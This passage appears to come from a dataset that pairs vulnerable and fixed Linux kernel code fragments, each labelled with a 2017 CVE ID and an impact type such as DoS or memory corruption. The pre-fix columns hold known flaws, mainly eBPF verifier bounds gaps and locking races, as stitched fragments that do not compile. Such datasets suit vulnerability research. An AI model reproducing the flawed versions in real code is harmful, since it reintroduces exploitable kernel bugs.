 struct hnae_ring *ring = ring_data->ring;
	dev_queue = netdev_get_tx_queue(ndev, skb->queue_mapping);
 netdev_tx_sent_queue(dev_queue, skb->len);

 netif_trans_update(ndev);
	ndev->stats.tx_bytes += skb->len;
	ndev->stats.tx_packets++;

 wmb(); /* commit all data before submit */
 assert(skb->queue_mapping < priv->ae_handle->q_num);
 hnae_queue_xmit(priv->ae_handle->qs[skb->queue_mapping], buf_num);
 struct net_device *ndev)
{
 struct hns_nic_priv *priv = netdev_priv(ndev);


 assert(skb->queue_mapping < ndev->ae_handle->q_num);

 return hns_nic_net_xmit_hw(ndev, skb,
				   &tx_ring_data(priv, skb->queue_mapping));





}

static void hns_nic_drop_rx_fetch(struct hns_nic_ring_data *ring_data,
void hns_nic_net_reset(struct net_device *ndev);
void hns_nic_net_reinit(struct net_device *netdev);
int hns_nic_init_phy(struct net_device *ndev, struct hnae_handle *h);
netdev_tx_t hns_nic_net_xmit_hw(struct net_device *ndev,
  struct sk_buff *skb,
  struct hns_nic_ring_data *ring_data);

#endif /**__HNS_ENET_H */
"
2018,DoS ,CVE-2017-18216," ""panic"",	/* O2NM_FENCE_PANIC */
};




struct o2nm_node *o2nm_get_node_by_num(u8 node_num)
{
 struct o2nm_node *node = NULL;
{
 /* through the first node_set .parent
	 * mycluster/nodes/mynode == o2nm_cluster->o2nm_node_group->o2nm_node */
 return to_o2nm_cluster(node->nd_item.ci_parent->ci_parent);



}

enum {
 size_t count)
{
 struct o2nm_node *node = to_o2nm_node(item);
 struct o2nm_cluster *cluster = to_o2nm_cluster_from_node(node);
 unsigned long tmp;
 char *p = (char *)page;
 int ret = 0;
	    !test_bit(O2NM_NODE_ATTR_PORT, &node->nd_set_attributes))
 return -EINVAL; /* XXX */








 write_lock(&cluster->cl_nodes_lock);
 if (cluster->cl_nodes[tmp])
		ret = -EEXIST;
 set_bit(tmp, cluster->cl_nodes_bitmap);
	}
 write_unlock(&cluster->cl_nodes_lock);


 if (ret)
 return ret;

 size_t count)
{
 struct o2nm_node *node = to_o2nm_node(item);
 struct o2nm_cluster *cluster = to_o2nm_cluster_from_node(node);
 int ret, i;
 struct rb_node **p, *parent;
 unsigned int octets[4];
 be32_add_cpu(&ipv4_addr, octets[i] << (i * 8));
	}








	ret = 0;
 write_lock(&cluster->cl_nodes_lock);
 if (o2nm_node_ip_tree_lookup(cluster, ipv4_addr, &p, &parent))
 rb_insert_color(&node->nd_ip_node, &cluster->cl_node_ip_tree);
	}
 write_unlock(&cluster->cl_nodes_lock);


 if (ret)
 return ret;

 size_t count)
{
 struct o2nm_node *node = to_o2nm_node(item);
 struct o2nm_cluster *cluster = to_o2nm_cluster_from_node(node);
 unsigned long tmp;
 char *p = (char *)page;
 ssize_t ret;
	    !test_bit(O2NM_NODE_ATTR_PORT, &node->nd_set_attributes))
 return -EINVAL; /* XXX */








 /* the only failure case is trying to set a new local node
	 * when a different one is already set */
 if (tmp && tmp == cluster->cl_has_local &&
	    cluster->cl_local_node != node->nd_num)
 return -EBUSY;



 /* bring up the rx thread if we're setting the new local node. */
 if (tmp && !cluster->cl_has_local) {
		ret = o2net_start_listening(node);
 if (ret)
 return ret;
	}

 if (!tmp && cluster->cl_has_local &&
		cluster->cl_local_node = node->nd_num;
	}

 return count;




}

CONFIGFS_ATTR(o2nm_node_, num);
	},
};











int o2nm_depend_item(struct config_item *item)
{
 return configfs_depend_item(&o2nm_cluster_group.cs_subsys, item);
"," ""panic"",	/* O2NM_FENCE_PANIC */
};

static inline void o2nm_lock_subsystem(void);
static inline void o2nm_unlock_subsystem(void);

struct o2nm_node *o2nm_get_node_by_num(u8 node_num)
{
 struct o2nm_node *node = NULL;
{
 /* through the first node_set .parent
	 * mycluster/nodes/mynode == o2nm_cluster->o2nm_node_group->o2nm_node */
 if (node->nd_item.ci_parent)
 return to_o2nm_cluster(node->nd_item.ci_parent->ci_parent);
 else
 return NULL;
}

enum {
 size_t count)
{
 struct o2nm_node *node = to_o2nm_node(item);
 struct o2nm_cluster *cluster;
 unsigned long tmp;
 char *p = (char *)page;
 int ret = 0;
	    !test_bit(O2NM_NODE_ATTR_PORT, &node->nd_set_attributes))
 return -EINVAL; /* XXX */

 o2nm_lock_subsystem();
	cluster = to_o2nm_cluster_from_node(node);
 if (!cluster) {
 o2nm_unlock_subsystem();
 return -EINVAL;
	}

 write_lock(&cluster->cl_nodes_lock);
 if (cluster->cl_nodes[tmp])
		ret = -EEXIST;
 set_bit(tmp, cluster->cl_nodes_bitmap);
	}
 write_unlock(&cluster->cl_nodes_lock);
 o2nm_unlock_subsystem();

 if (ret)
 return ret;

 size_t count)
{
 struct o2nm_node *node = to_o2nm_node(item);
 struct o2nm_cluster *cluster;
 int ret, i;
 struct rb_node **p, *parent;
 unsigned int octets[4];
 be32_add_cpu(&ipv4_addr, octets[i] << (i * 8));
	}

 o2nm_lock_subsystem();
	cluster = to_o2nm_cluster_from_node(node);
 if (!cluster) {
 o2nm_unlock_subsystem();
 return -EINVAL;
	}

	ret = 0;
 write_lock(&cluster->cl_nodes_lock);
 if (o2nm_node_ip_tree_lookup(cluster, ipv4_addr, &p, &parent))
 rb_insert_color(&node->nd_ip_node, &cluster->cl_node_ip_tree);
	}
 write_unlock(&cluster->cl_nodes_lock);
 o2nm_unlock_subsystem();

 if (ret)
 return ret;

 size_t count)
{
 struct o2nm_node *node = to_o2nm_node(item);
 struct o2nm_cluster *cluster;
 unsigned long tmp;
 char *p = (char *)page;
 ssize_t ret;
	    !test_bit(O2NM_NODE_ATTR_PORT, &node->nd_set_attributes))
 return -EINVAL; /* XXX */

 o2nm_lock_subsystem();
	cluster = to_o2nm_cluster_from_node(node);
 if (!cluster) {
		ret = -EINVAL;
 goto out;
	}

 /* the only failure case is trying to set a new local node
	 * when a different one is already set */
 if (tmp && tmp == cluster->cl_has_local &&
	    cluster->cl_local_node != node->nd_num) {
		ret = -EBUSY;
 goto out;
	}

 /* bring up the rx thread if we're setting the new local node. */
 if (tmp && !cluster->cl_has_local) {
		ret = o2net_start_listening(node);
 if (ret)
 goto out;
	}

 if (!tmp && cluster->cl_has_local &&
		cluster->cl_local_node = node->nd_num;
	}

	ret = count;

out:
 o2nm_unlock_subsystem();
 return ret;
}

CONFIGFS_ATTR(o2nm_node_, num);
	},
};

static inline void o2nm_lock_subsystem(void)
{
 mutex_lock(&o2nm_cluster_group.cs_subsys.su_mutex);
}

static inline void o2nm_unlock_subsystem(void)
{
 mutex_unlock(&o2nm_cluster_group.cs_subsys.su_mutex);
}

int o2nm_depend_item(struct config_item *item)
{
 return configfs_depend_item(&o2nm_cluster_group.cs_subsys, item);
"
2018,DoS ,CVE-2017-18208,"{
 struct file *file = vma->vm_file;


#ifdef CONFIG_SWAP
 if (!file) {
		*prev = vma;
 force_swapin_readahead(vma, start, end);
 return 0;
	}

 if (shmem_mapping(file->f_mapping)) {
		*prev = vma;
 force_shm_swapin_readahead(vma, start, end,
					file->f_mapping);
 return 0;
 return 0;
	}

	*prev = vma;
	start = ((start - vma->vm_start) >> PAGE_SHIFT) + vma->vm_pgoff;
 if (end > vma->vm_end)
		end = vma->vm_end;
","{
 struct file *file = vma->vm_file;

	*prev = vma;
#ifdef CONFIG_SWAP
 if (!file) {

 force_swapin_readahead(vma, start, end);
 return 0;
	}

 if (shmem_mapping(file->f_mapping)) {

 force_shm_swapin_readahead(vma, start, end,
					file->f_mapping);
 return 0;
 return 0;
	}


	start = ((start - vma->vm_start) >> PAGE_SHIFT) + vma->vm_pgoff;
 if (end > vma->vm_end)
		end = vma->vm_end;
"
2018,DoS ,CVE-2017-18204,"	}
	size_change = S_ISREG(inode->i_mode) && attr->ia_valid & ATTR_SIZE;
 if (size_change) {







		status = ocfs2_rw_lock(inode, 1);
 if (status < 0) {
 mlog_errno(status);
 if (status)
 goto bail_unlock;

 inode_dio_wait(inode);

 if (i_size_read(inode) >= attr->ia_size) {
 if (ocfs2_should_order_data(inode)) {
				status = ocfs2_begin_ordered_truncate(inode,
","	}
	size_change = S_ISREG(inode->i_mode) && attr->ia_valid & ATTR_SIZE;
 if (size_change) {
 /*
		 * Here we should wait dio to finish before inode lock
		 * to avoid a deadlock between ocfs2_setattr() and
		 * ocfs2_dio_end_io_write()
 */
 inode_dio_wait(inode);

		status = ocfs2_rw_lock(inode, 1);
 if (status < 0) {
 mlog_errno(status);
 if (status)
 goto bail_unlock;



 if (i_size_read(inode) >= attr->ia_size) {
 if (ocfs2_should_order_data(inode)) {
				status = ocfs2_begin_ordered_truncate(inode,
"
2018,DoS ,CVE-2017-18203,"
	md = container_of(kobj, struct mapped_device, kobj_holder.kobj);

 if (test_bit(DMF_FREEING, &md->flags) ||
 dm_deleting_md(md))
 return NULL;


 dm_get(md);



 return md;
}

","
	md = container_of(kobj, struct mapped_device, kobj_holder.kobj);

 spin_lock(&_minor_lock);
 if (test_bit(DMF_FREEING, &md->flags) || dm_deleting_md(md)) {
		md = NULL;
 goto out;
	}
 dm_get(md);
out:
 spin_unlock(&_minor_lock);

 return md;
}

"
2018,DoS ,CVE-2017-18202," */
 set_bit(MMF_UNSTABLE, &mm->flags);

 tlb_gather_mmu(&tlb, mm, 0, -1);
 for (vma = mm->mmap ; vma; vma = vma->vm_next) {
 if (!can_madv_dontneed_vma(vma))
 continue;
		 * we do not want to block exit_mmap by keeping mm ref
		 * count elevated without a good reason.
 */
 if (vma_is_anonymous(vma) || !(vma->vm_flags & VM_SHARED))

 unmap_page_range(&tlb, vma, vma->vm_start, vma->vm_end,
 NULL);


	}
 tlb_finish_mmu(&tlb, 0, -1);
 pr_info(""oom_reaper: reaped process %d (%s), now anon-rss:%lukB, file-rss:%lukB, shmem-rss:%lukB\n"",
 task_pid_nr(tsk), tsk->comm,
 K(get_mm_counter(mm, MM_ANONPAGES)),
"," */
 set_bit(MMF_UNSTABLE, &mm->flags);


 for (vma = mm->mmap ; vma; vma = vma->vm_next) {
 if (!can_madv_dontneed_vma(vma))
 continue;
		 * we do not want to block exit_mmap by keeping mm ref
		 * count elevated without a good reason.
 */
 if (vma_is_anonymous(vma) || !(vma->vm_flags & VM_SHARED)) {
 tlb_gather_mmu(&tlb, mm, vma->vm_start, vma->vm_end);
 unmap_page_range(&tlb, vma, vma->vm_start, vma->vm_end,
 NULL);
 tlb_finish_mmu(&tlb, vma->vm_start, vma->vm_end);
		}
	}

 pr_info(""oom_reaper: reaped process %d (%s), now anon-rss:%lukB, file-rss:%lukB, shmem-rss:%lukB\n"",
 task_pid_nr(tsk), tsk->comm,
 K(get_mm_counter(mm, MM_ANONPAGES)),
"
2018,DoS ,CVE-2017-18200,"bool is_checkpointed_data(struct f2fs_sb_info *sbi, block_t blkaddr);
void refresh_sit_entry(struct f2fs_sb_info *sbi, block_t old, block_t new);
void stop_discard_thread(struct f2fs_sb_info *sbi);
void f2fs_wait_discard_bios(struct f2fs_sb_info *sbi);
void clear_prefree_segments(struct f2fs_sb_info *sbi, struct cp_control *cpc);
void release_discard_addrs(struct f2fs_sb_info *sbi);
int npages_for_summary_flush(struct f2fs_sb_info *sbi, bool for_ra);
}

/* This comes from f2fs_put_super and f2fs_trim_fs */
void f2fs_wait_discard_bios(struct f2fs_sb_info *sbi)
{
 __issue_discard_cmd(sbi, false);
 __drop_discard_cmd(sbi);
 __wait_discard_cmd(sbi, false);
}

static void mark_discard_range_all(struct f2fs_sb_info *sbi)
	}
 /* It's time to issue all the filed discards */
 mark_discard_range_all(sbi);
 f2fs_wait_discard_bios(sbi);
out:
	range->len = F2FS_BLK_TO_BYTES(cpc.trimmed);
 return err;
	}

 /* be sure to wait for any on-going discard commands */
 f2fs_wait_discard_bios(sbi);

 if (f2fs_discard_en(sbi) && !sbi->discard_blks) {
 struct cp_control cpc = {
","bool is_checkpointed_data(struct f2fs_sb_info *sbi, block_t blkaddr);
void refresh_sit_entry(struct f2fs_sb_info *sbi, block_t old, block_t new);
void stop_discard_thread(struct f2fs_sb_info *sbi);
void f2fs_wait_discard_bios(struct f2fs_sb_info *sbi, bool umount);
void clear_prefree_segments(struct f2fs_sb_info *sbi, struct cp_control *cpc);
void release_discard_addrs(struct f2fs_sb_info *sbi);
int npages_for_summary_flush(struct f2fs_sb_info *sbi, bool for_ra);
}

/* This comes from f2fs_put_super and f2fs_trim_fs */
void f2fs_wait_discard_bios(struct f2fs_sb_info *sbi, bool umount)
{
 __issue_discard_cmd(sbi, false);
 __drop_discard_cmd(sbi);
 __wait_discard_cmd(sbi, !umount);
}

static void mark_discard_range_all(struct f2fs_sb_info *sbi)
	}
 /* It's time to issue all the filed discards */
 mark_discard_range_all(sbi);
 f2fs_wait_discard_bios(sbi, false);
out:
	range->len = F2FS_BLK_TO_BYTES(cpc.trimmed);
 return err;
	}

 /* be sure to wait for any on-going discard commands */
 f2fs_wait_discard_bios(sbi, true);

 if (f2fs_discard_en(sbi) && !sbi->discard_blks) {
 struct cp_control cpc = {
"
2018,DoS Overflow ,CVE-2017-18193,"}

/* return true, if inode page is changed */
bool f2fs_init_extent_tree(struct inode *inode, struct f2fs_extent *i_ext)
{
 struct f2fs_sb_info *sbi = F2FS_I_SB(inode);
 struct extent_tree *et;
 return false;
}











static bool f2fs_lookup_extent_tree(struct inode *inode, pgoff_t pgofs,
 struct extent_info *ei)
{
","}

/* return true, if inode page is changed */
static bool __f2fs_init_extent_tree(struct inode *inode, struct f2fs_extent *i_ext)
{
 struct f2fs_sb_info *sbi = F2FS_I_SB(inode);
 struct extent_tree *et;
 return false;
}

bool f2fs_init_extent_tree(struct inode *inode, struct f2fs_extent *i_ext)
{
 bool ret =  __f2fs_init_extent_tree(inode, i_ext);

 if (!F2FS_I(inode)->extent_tree)
 set_inode_flag(inode, FI_NO_EXTENT);

 return ret;
}

static bool f2fs_lookup_extent_tree(struct inode *inode, pgoff_t pgofs,
 struct extent_info *ei)
{
"
2018,,CVE-2017-18174,"	gpio_dev->ngroups = ARRAY_SIZE(kerncz_groups);

	amd_pinctrl_desc.name = dev_name(&pdev->dev);
	gpio_dev->pctrl = pinctrl_register(&amd_pinctrl_desc,
 &pdev->dev, gpio_dev);
 if (IS_ERR(gpio_dev->pctrl)) {
 dev_err(&pdev->dev, ""Couldn't register pinctrl driver\n"");
 return PTR_ERR(gpio_dev->pctrl);
	}

	ret = gpiochip_add_data(&gpio_dev->gc, gpio_dev);
 if (ret)
 goto out1;

	ret = gpiochip_add_pin_range(&gpio_dev->gc, dev_name(&pdev->dev),
 0, 0, TOTAL_NUMBER_OF_PINS);
out2:
 gpiochip_remove(&gpio_dev->gc);

out1:
 pinctrl_unregister(gpio_dev->pctrl);
 return ret;
}

	gpio_dev = platform_get_drvdata(pdev);

 gpiochip_remove(&gpio_dev->gc);
 pinctrl_unregister(gpio_dev->pctrl);

 return 0;
}
","	gpio_dev->ngroups = ARRAY_SIZE(kerncz_groups);

	amd_pinctrl_desc.name = dev_name(&pdev->dev);
	gpio_dev->pctrl = devm_pinctrl_register(&pdev->dev, &amd_pinctrl_desc,
  gpio_dev);
 if (IS_ERR(gpio_dev->pctrl)) {
 dev_err(&pdev->dev, ""Couldn't register pinctrl driver\n"");
 return PTR_ERR(gpio_dev->pctrl);
	}

	ret = gpiochip_add_data(&gpio_dev->gc, gpio_dev);
 if (ret)
 return ret;

	ret = gpiochip_add_pin_range(&gpio_dev->gc, dev_name(&pdev->dev),
 0, 0, TOTAL_NUMBER_OF_PINS);
out2:
 gpiochip_remove(&gpio_dev->gc);



 return ret;
}

	gpio_dev = platform_get_drvdata(pdev);

 gpiochip_remove(&gpio_dev->gc);


 return 0;
}
"
2018,DoS ,CVE-2017-18079,"{
 struct i8042_port *port = serio->port_data;


	port->exists = true;
 mb();

 return 0;
}

{
 struct i8042_port *port = serio->port_data;


	port->exists = false;



 /*


	 * We synchronize with both AUX and KBD IRQs because there is
	 * a (very unlikely) chance that AUX IRQ is raised for KBD port
	 * and vice versa.
 */
 synchronize_irq(I8042_AUX_IRQ);
 synchronize_irq(I8042_KBD_IRQ);
	port->serio = NULL;
}

/*

 spin_unlock_irqrestore(&i8042_lock, flags);

 if (likely(port->exists && !filtered))
 serio_interrupt(serio, data, dfl);

 out:
","{
 struct i8042_port *port = serio->port_data;

 spin_lock_irq(&i8042_lock);
	port->exists = true;
 spin_unlock_irq(&i8042_lock);

 return 0;
}

{
 struct i8042_port *port = serio->port_data;

 spin_lock_irq(&i8042_lock);
	port->exists = false;
	port->serio = NULL;
 spin_unlock_irq(&i8042_lock);

 /*
	 * We need to make sure that interrupt handler finishes using
	 * our serio port before we return from this function.
	 * We synchronize with both AUX and KBD IRQs because there is
	 * a (very unlikely) chance that AUX IRQ is raised for KBD port
	 * and vice versa.
 */
 synchronize_irq(I8042_AUX_IRQ);
 synchronize_irq(I8042_KBD_IRQ);

}

/*

 spin_unlock_irqrestore(&i8042_lock, flags);

 if (likely(serio && !filtered))
 serio_interrupt(serio, data, dfl);

 out:
"
2018,DoS ,CVE-2017-18075," crypto_free_aead(ctx->child);
}









static int pcrypt_init_instance(struct crypto_instance *inst,
 struct crypto_alg *alg)
{
	inst->alg.encrypt = pcrypt_aead_encrypt;
	inst->alg.decrypt = pcrypt_aead_decrypt;



	err = aead_register_instance(tmpl, inst);
 if (err)
 goto out_drop_aead;
 return -EINVAL;
}

static void pcrypt_free(struct crypto_instance *inst)
{
 struct pcrypt_instance_ctx *ctx = crypto_instance_ctx(inst);

 crypto_drop_aead(&ctx->spawn);
 kfree(inst);
}

static int pcrypt_cpumask_change_notify(struct notifier_block *self,
 unsigned long val, void *data)
{
static struct crypto_template pcrypt_tmpl = {
	.name = ""pcrypt"",
	.create = pcrypt_create,
	.free = pcrypt_free,
	.module = THIS_MODULE,
};

"," crypto_free_aead(ctx->child);
}

static void pcrypt_free(struct aead_instance *inst)
{
 struct pcrypt_instance_ctx *ctx = aead_instance_ctx(inst);

 crypto_drop_aead(&ctx->spawn);
 kfree(inst);
}

static int pcrypt_init_instance(struct crypto_instance *inst,
 struct crypto_alg *alg)
{
	inst->alg.encrypt = pcrypt_aead_encrypt;
	inst->alg.decrypt = pcrypt_aead_decrypt;

	inst->free = pcrypt_free;

	err = aead_register_instance(tmpl, inst);
 if (err)
 goto out_drop_aead;
 return -EINVAL;
}









static int pcrypt_cpumask_change_notify(struct notifier_block *self,
 unsigned long val, void *data)
{
static struct crypto_template pcrypt_tmpl = {
	.name = ""pcrypt"",
	.create = pcrypt_create,

	.module = THIS_MODULE,
};

"
2018,DoS Mem. Corr. ,CVE-2017-18017,"	tcph = (struct tcphdr *)(skb_network_header(skb) + tcphoff);
	tcp_hdrlen = tcph->doff * 4;

 if (len < tcp_hdrlen)
 return -1;

 if (info->mss == XT_TCPMSS_CLAMP_PMTU) {
 if (len > tcp_hdrlen)
 return 0;





 /*
	 * MSS Option not found ?! add it..
 */
","	tcph = (struct tcphdr *)(skb_network_header(skb) + tcphoff);
	tcp_hdrlen = tcph->doff * 4;

 if (len < tcp_hdrlen || tcp_hdrlen < sizeof(struct tcphdr))
 return -1;

 if (info->mss == XT_TCPMSS_CLAMP_PMTU) {
 if (len > tcp_hdrlen)
 return 0;

 /* tcph->doff has 4 bits, do not wrap it to 0 */
 if (tcp_hdrlen >= 15 * 4)
 return 0;

 /*
	 * MSS Option not found ?! add it..
 */
"
2017,DoS ,CVE-2017-17975,,
2017,#NAME?,CVE-2017-17864,,
2017,DoS Overflow ,CVE-2017-17863,,
2017,DoS ,CVE-2017-17862," struct bpf_map *map_ptr;	/* pointer for call insn into lookup_elem */
	};
 int ctx_field_size; /* the ctx field size for load insn, maybe 0 */
 int converted_op_size; /* the valid value width after perceived conversion */
};

#define MAX_USED_MAPS 64 /* max number of maps accessed by one eBPF program */
 return err;

		regs = cur_regs(env);

 if (class == BPF_ALU || class == BPF_ALU64) {
			err = check_alu_op(env, insn);
 if (err)
 return err;

				insn_idx++;

			} else {
 verbose(env, ""invalid BPF_LD mode\n"");
 return -EINVAL;
				u32 off, u32 cnt)
{
 struct bpf_insn_aux_data *new_data, *old_data = env->insn_aux_data;


 if (cnt == 1)
 return 0;
 memcpy(new_data, old_data, sizeof(struct bpf_insn_aux_data) * off);
 memcpy(new_data + off + cnt - 1, old_data + off,
 sizeof(struct bpf_insn_aux_data) * (prog_len - off - cnt + 1));


	env->insn_aux_data = new_data;
 vfree(old_data);
 return 0;
 return new_prog;
}




















/* convert load instructions that access fields of 'struct __sk_buff'
 * into sequence of instructions that access fields of 'struct sk_buff'
 */
 while (!pop_stack(env, NULL, NULL));
 free_states(env);




 if (ret == 0)
 /* program is valid, convert *(u32*)(ctx + off) accesses */
		ret = convert_ctx_accesses(env);
"," struct bpf_map *map_ptr;	/* pointer for call insn into lookup_elem */
	};
 int ctx_field_size; /* the ctx field size for load insn, maybe 0 */
 bool seen; /* this insn was processed by the verifier */
};

#define MAX_USED_MAPS 64 /* max number of maps accessed by one eBPF program */
 return err;

		regs = cur_regs(env);
		env->insn_aux_data[insn_idx].seen = true;
 if (class == BPF_ALU || class == BPF_ALU64) {
			err = check_alu_op(env, insn);
 if (err)
 return err;

				insn_idx++;
				env->insn_aux_data[insn_idx].seen = true;
			} else {
 verbose(env, ""invalid BPF_LD mode\n"");
 return -EINVAL;
				u32 off, u32 cnt)
{
 struct bpf_insn_aux_data *new_data, *old_data = env->insn_aux_data;
 int i;

 if (cnt == 1)
 return 0;
 memcpy(new_data, old_data, sizeof(struct bpf_insn_aux_data) * off);
 memcpy(new_data + off + cnt - 1, old_data + off,
 sizeof(struct bpf_insn_aux_data) * (prog_len - off - cnt + 1));
 for (i = off; i < off + cnt - 1; i++)
		new_data[i].seen = true;
	env->insn_aux_data = new_data;
 vfree(old_data);
 return 0;
 return new_prog;
}

/* The verifier does more data flow analysis than llvm and will not explore
 * branches that are dead at run time. Malicious programs can have dead code
 * too. Therefore replace all dead at-run-time code with nops.
 */
static void sanitize_dead_code(struct bpf_verifier_env *env)
{
 struct bpf_insn_aux_data *aux_data = env->insn_aux_data;
 struct bpf_insn nop = BPF_MOV64_REG(BPF_REG_0, BPF_REG_0);
 struct bpf_insn *insn = env->prog->insnsi;
 const int insn_cnt = env->prog->len;
 int i;

 for (i = 0; i < insn_cnt; i++) {
 if (aux_data[i].seen)
 continue;
 memcpy(insn + i, &nop, sizeof(nop));
	}
}

/* convert load instructions that access fields of 'struct __sk_buff'
 * into sequence of instructions that access fields of 'struct sk_buff'
 */
 while (!pop_stack(env, NULL, NULL));
 free_states(env);

 if (ret == 0)
 sanitize_dead_code(env);

 if (ret == 0)
 /* program is valid, convert *(u32*)(ctx + off) accesses */
		ret = convert_ctx_accesses(env);
"
2017,DoS Overflow Mem. Corr. ,CVE-2017-17857," tnum_strn(tn_buf, sizeof(tn_buf), regs[regno].var_off);
 verbose(env, ""invalid variable stack read R%d var_off=%s\n"",
			regno, tn_buf);

	}
	off = regs[regno].off + regs[regno].var_off.value;
 if (off >= 0 || off < -MAX_BPF_STACK || off + access_size > 0 ||
"," tnum_strn(tn_buf, sizeof(tn_buf), regs[regno].var_off);
 verbose(env, ""invalid variable stack read R%d var_off=%s\n"",
			regno, tn_buf);
 return -EACCES;
	}
	off = regs[regno].off + regs[regno].var_off.value;
 if (off >= 0 || off < -MAX_BPF_STACK || off + access_size > 0 ||
"
2017,DoS Overflow Mem. Corr. ,CVE-2017-17856," break;
 case PTR_TO_STACK:
		pointer_desc = ""stack "";





 break;
 default:
 break;
"," break;
 case PTR_TO_STACK:
		pointer_desc = ""stack "";
 /* The stack spill tracking logic in check_stack_write()
		 * and check_stack_read() relies on stack accesses being
		 * aligned.
 */
		strict = true;
 break;
 default:
 break;
"
2017,DoS Overflow Mem. Corr. ,CVE-2017-17855," return range_within(rold, rcur) &&
 tnum_in(rold->var_off, rcur->var_off);
		} else {
 /* if we knew anything about the old value, we're not
			 * equal, because we can't know anything about the
			 * scalar value of the pointer in the new value.



 */
 return rold->umin_value == 0 &&
			       rold->umax_value == U64_MAX &&
			       rold->smin_value == S64_MIN &&
			       rold->smax_value == S64_MAX &&
 tnum_is_unknown(rold->var_off);
		}
 case PTR_TO_MAP_VALUE:
 /* If the new min/max/var_off satisfy the old ones and
"," return range_within(rold, rcur) &&
 tnum_in(rold->var_off, rcur->var_off);
		} else {
 /* We're trying to use a pointer in place of a scalar.
			 * Even if the scalar was unbounded, this could lead to
			 * pointer leaks because scalars are allowed to leak
			 * while pointers are not. We could make this safe in
			 * special cases if root is calling us, but it's
			 * probably not worth the hassle.
 */
 return false;




		}
 case PTR_TO_MAP_VALUE:
 /* If the new min/max/var_off satisfy the old ones and
"
2017,DoS Overflow Mem. Corr. ,CVE-2017-17854," * In practice this is far bigger than any realistic pointer offset; this limit
 * ensures that umax_value + (int)off + (int)size cannot overflow a u64.
 */
#define BPF_MAX_VAR_OFF	(1ULL << 31)
/* Maximum variable size permitted for ARG_CONST_SIZE[_OR_ZERO].  This ensures
 * that converting umax_value to int cannot overflow.
 */
#define BPF_MAX_VAR_SIZ INT_MAX

/* Liveness marks, used for registers and spilled-regs (in stack slots).
 * Read marks propagate upwards until they find a write mark; they record that
 return res > a;
}




































/* Handles arithmetic on a pointer and a scalar: computes new min/max and var_off.
 * Caller should also handle BPF_MOV case separately.
 * If we return -EACCES, caller may want to try again treating pointer as a
	dst_reg->type = ptr_reg->type;
	dst_reg->id = ptr_reg->id;





 switch (opcode) {
 case BPF_ADD:
 /* We can take a fixed offset as long as it doesn't overflow
 return -EACCES;
	}




 __update_reg_bounds(dst_reg);
 __reg_deduce_bounds(dst_reg);
 __reg_bound_offset(dst_reg);
	src_known = tnum_is_const(src_reg.var_off);
	dst_known = tnum_is_const(dst_reg->var_off);







 switch (opcode) {
 case BPF_ADD:
 if (signed_add_overflows(dst_reg->smin_value, smin_val) ||
"," * In practice this is far bigger than any realistic pointer offset; this limit
 * ensures that umax_value + (int)off + (int)size cannot overflow a u64.
 */
#define BPF_MAX_VAR_OFF	(1 << 29)
/* Maximum variable size permitted for ARG_CONST_SIZE[_OR_ZERO].  This ensures
 * that converting umax_value to int cannot overflow.
 */
#define BPF_MAX_VAR_SIZ (1 << 29)

/* Liveness marks, used for registers and spilled-regs (in stack slots).
 * Read marks propagate upwards until they find a write mark; they record that
 return res > a;
}

static bool check_reg_sane_offset(struct bpf_verifier_env *env,
 const struct bpf_reg_state *reg,
 enum bpf_reg_type type)
{
 bool known = tnum_is_const(reg->var_off);
	s64 val = reg->var_off.value;
	s64 smin = reg->smin_value;

 if (known && (val >= BPF_MAX_VAR_OFF || val <= -BPF_MAX_VAR_OFF)) {
 verbose(env, ""math between %s pointer and %lld is not allowed\n"",
			reg_type_str[type], val);
 return false;
	}

 if (reg->off >= BPF_MAX_VAR_OFF || reg->off <= -BPF_MAX_VAR_OFF) {
 verbose(env, ""%s pointer offset %d is not allowed\n"",
			reg_type_str[type], reg->off);
 return false;
	}

 if (smin == S64_MIN) {
 verbose(env, ""math between %s pointer and register with unbounded min value is not allowed\n"",
			reg_type_str[type]);
 return false;
	}

 if (smin >= BPF_MAX_VAR_OFF || smin <= -BPF_MAX_VAR_OFF) {
 verbose(env, ""value %lld makes %s pointer be out of bounds\n"",
			smin, reg_type_str[type]);
 return false;
	}

 return true;
}

/* Handles arithmetic on a pointer and a scalar: computes new min/max and var_off.
 * Caller should also handle BPF_MOV case separately.
 * If we return -EACCES, caller may want to try again treating pointer as a
	dst_reg->type = ptr_reg->type;
	dst_reg->id = ptr_reg->id;

 if (!check_reg_sane_offset(env, off_reg, ptr_reg->type) ||
	    !check_reg_sane_offset(env, ptr_reg, ptr_reg->type))
 return -EINVAL;

 switch (opcode) {
 case BPF_ADD:
 /* We can take a fixed offset as long as it doesn't overflow
 return -EACCES;
	}

 if (!check_reg_sane_offset(env, dst_reg, ptr_reg->type))
 return -EINVAL;

 __update_reg_bounds(dst_reg);
 __reg_deduce_bounds(dst_reg);
 __reg_bound_offset(dst_reg);
	src_known = tnum_is_const(src_reg.var_off);
	dst_known = tnum_is_const(dst_reg->var_off);

 if (!src_known &&
	    opcode != BPF_ADD && opcode != BPF_SUB && opcode != BPF_AND) {
 __mark_reg_unknown(dst_reg);
 return 0;
	}

 switch (opcode) {
 case BPF_ADD:
 if (signed_add_overflows(dst_reg->smin_value, smin_val) ||
"
2017,DoS Overflow Mem. Corr. ,CVE-2017-17853," mark_reg_unknown(env, regs, insn->dst_reg);
 break;
		}
 /* BPF_RSH is an unsigned shift, so make the appropriate casts */
 if (dst_reg->smin_value < 0) {
 if (umin_val) {
 /* Sign bit will be cleared */
				dst_reg->smin_value = 0;
			} else {
 /* Lost sign bit information */
				dst_reg->smin_value = S64_MIN;
				dst_reg->smax_value = S64_MAX;
			}
		} else {
			dst_reg->smin_value =
				(u64)(dst_reg->smin_value) >> umax_val;
		}


 if (src_known)
			dst_reg->var_off = tnum_rshift(dst_reg->var_off,
						       umin_val);
"," mark_reg_unknown(env, regs, insn->dst_reg);
 break;
		}
 /* BPF_RSH is an unsigned shift.  If the value in dst_reg might
		 * be negative, then either:
		 * 1) src_reg might be zero, so the sign bit of the result is
		 *    unknown, so we lose our signed bounds
		 * 2) it's known negative, thus the unsigned bounds capture the
		 *    signed bounds
		 * 3) the signed bounds cross zero, so they tell us nothing
		 *    about the result
		 * If the value in dst_reg is known nonnegative, then again the
		 * unsigned bounts capture the signed bounds.
		 * Thus, in all cases it suffices to blow away our signed bounds
		 * and rely on inferring new ones from the unsigned bounds and
		 * var_off of the result.
 */
		dst_reg->smin_value = S64_MIN;
		dst_reg->smax_value = S64_MAX;
 if (src_known)
			dst_reg->var_off = tnum_rshift(dst_reg->var_off,
						       umin_val);
"
2017,DoS Overflow Mem. Corr. ,CVE-2017-17852," return 0;
}





